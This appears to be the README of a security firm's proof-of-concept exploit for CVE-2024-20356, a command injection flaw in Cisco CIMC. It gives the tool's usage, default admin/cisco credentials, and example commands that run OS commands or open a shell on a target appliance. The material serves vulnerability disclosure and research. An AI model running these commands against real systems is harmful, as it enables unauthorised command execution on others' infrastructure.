# CVE-2024-20356
This is a proof of concept for CVE-2024-20356, a Command Injection vulnerability in Cisco's CIMC.

Full technical details can be found at [https://labs.nettitude.com/blog/cve-2024-20356-jailbreaking-a-cisco-appliance-to-run-doom](https://labs.nettitude.com/blog/cve-2024-20356-jailbreaking-a-cisco-appliance-to-run-doom)

## Usage
```
Usage: CVE-2024-20356.py [-h] -t HOST -u USERNAME -p PASSWORD [-a ACTION] [-c CMD] [-v]
options:
  -h, --help            Show this help message and exit
  -t HOST, --host HOST  Target hostname or IP address (format 10.0.0.1 or 10.0.0.2:1337)
  -u USERNAME, --username USERNAME
                        Username (default: admin)
  -p PASSWORD, --password PASSWORD
                        Password (default: cisco)
  -a ACTION, --action ACTION
                        Action: test, cmd, shell, dance (default: test)
  -c CMD, --cmd CMD     OS command to run (Default: NONE)
  -v, --verbose         Displays more information about cimc
```

Example commands:
```
CVE-2024-20356.py --host 192.168.x.x -u admin -p your_password -v
CVE-2024-20356.py --host 192.168.x.x -u admin -p your_password -c 'id'
CVE-2024-20356.py --host 192.168.x.x -u admin -p your_password -a shell
CVE-2024-20356.py --host 192.168.x.x -u admin -p your_password -a dance
```

Use the `--help` argument for full usage instructions.

## Disclaimer
This proof-of-concept is for demonstration purposes and should not be used for illegal activities. LRQA Nettitude are not responsible for any damage caused by the use or misuse of this code.
